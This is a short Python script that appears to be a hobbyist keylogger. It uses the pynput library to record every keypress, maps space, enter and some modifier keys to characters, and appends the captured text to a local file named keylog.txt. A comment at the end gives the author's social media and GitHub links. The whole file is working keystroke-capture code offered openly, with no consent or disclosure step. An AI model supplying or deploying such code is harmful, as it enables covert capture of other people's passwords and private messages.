from pynput.keyboard import Listener


def file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("keylog.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=file) as kl:
    kl.join()
    
'''
Support On

LinkedIn = https://www.linkedin.com/in/abinash-kumar-sinha-318331250
GitHub = https://github.com/Abinash141


Thank You
'''